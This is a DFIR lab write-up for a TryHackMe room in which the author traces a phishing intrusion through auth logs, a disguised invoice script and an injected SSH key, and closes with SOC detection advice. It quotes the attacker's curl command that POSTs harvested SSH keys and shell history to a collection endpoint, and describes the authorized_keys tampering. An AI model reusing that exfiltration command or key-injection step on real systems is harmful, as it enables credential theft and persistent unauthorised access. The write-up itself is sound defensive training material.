@@ -1,0 +1,55 @@
+# Room Name - TryHackMe: Practical - The Digital Trail
+Date: 20 April 2026
+Difficulty: Easy
+Category: DFIR / AI-Assisted Log Analysis
+
+# Scenario
+Welcome to The Digital Trail, an interactive DFIR lab built to showcase how AI/ML can be used to give you an investigative edge. The challenge involved activating a DFIR environment, analysing authentication logs using an AI classifier, tracing an attacker's movements across user accounts, and uncovering a phishing-led intrusion chain.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- DFIR Python Environment (dfir-env)
+- classify_logs.py (AI/ML log classifier)
+- file_anomalies.py
+- LibreOffice (to inspect .ods file)
+- sudo nano
+
+# What I Did
+- Activated the DFIR environment by running: source /opt/dfir-env/bin/activate
+- Ran the AI log classifier against the auth log: python3 /opt/dfir-lab/classify_logs.py /var/log/auth.log
+- The classifier flagged three suspicious entries:
+  - Failed password attempt for invalid user admin from 192.168.0.100
+  - Accepted password for j.morgan from 192.168.0.100 at 03:01:02 (suspicious successful login)
+  - Accepted publickey for r.house from 192.168.0.100 at 03:15:00 (lateral movement)
+- Identified that j.morgan's successful login was suspicious as it followed a failed brute-force attempt from the same IP.
+- Listed contents of /opt/dfir-lab using ls -l and found an anomaly detection script: file_anomalies.py
+- Ran the script and identified a suspicious hidden file: /dev/shm/.core_dump_2025.tgz.enc
+  - The dual extension (.tgz.enc) was designed to disguise it as a legitimate system file.
+- The script output pointed to /tmp/invoice_dump.txt which contained a captured bash history.
+- Reviewed the bash history and found the attacker had navigated to j.morgan's invoice directory, opened a file, inspected SSH config, and modified r.house's authorized_keys.
+- Navigated to /home/j.morgan/Documents/Invoices and opened invoice_Q1_2075.ods.
+- The file was not a real invoice but a malicious script that collected shell history, active users, SSH config, SSH keys, and system usernames, then exfiltrated the data via: curl -X POST -F "data=@$OUT" http://192.168.0.100:8080/collect.php
+- Ran sudo nano /home/r.house/.ssh/authorized_keys and found the attacker's public key had been injected: ssh-rsa AAAAB3...attackers-key
+- Found an email directory within j.morgan's home folder and opened email_invoice.eml.
+- The email was sent by A. Keane (akeane@poseidonenergy.net) posing as a Director of Field Operations at Poseidon Energy, with the malicious invoice attached, confirming a phishing attack as the initial access method.
+
+# What I Found
+- Attacker Login Time (as j.morgan): 03:01:02
+- Initial Access Method: Phishing
+- Attacker Email Address: akeane@poseidonenergy.net
+- Command Used for Lateral Movement: sudo nano /home/r.house/.ssh/authorized_keys
+- Exfiltration Archive Path: /dev/shm/.core_dump_2025.tgz.enc
+- Exfiltration Endpoint: http://192.168.0.100:8080/collect.php
+- Attacker's Injected SSH Key: ssh-rsa AAAAB3...attackers-key
+
+# Key Learning
+AI/ML classifiers can rapidly triage large log files and surface suspicious entries that a manual review might miss or deprioritise. A successful login immediately following a failed attempt from the same IP is a strong indicator of credential compromise. Malicious files can be disguised using dual or misleading extensions to blend in with legitimate system files. A phishing email carrying a macro-enabled or script-embedded document remains one of the most effective initial access techniques, as it bypasses technical controls by exploiting user trust.
+
+# What I Would Flag in a Real SOC
+- Successful SSH login from the same IP that just failed a brute-force attempt should trigger an immediate alert and account review
+- Login activity at 03:00 from an internal IP warrants scrutiny, off-hours access is a key behavioural indicator
+- Modification of another user's authorized_keys file (especially via sudo) is a critical lateral movement indicator and should be alerted on in real time via file integrity monitoring
+- Outbound curl POST to an internal IP on a non-standard port (8080) from a user session is a strong data exfiltration signal
+- Hidden files in /dev/shm with misleading extensions should be flagged by endpoint detection, /dev/shm is a common attacker staging ground as it is memory-resident and does not persist across reboots
+- Phishing emails impersonating external business partners with urgent financial language and attached documents should be caught at the email gateway with attachment sandboxing enabled
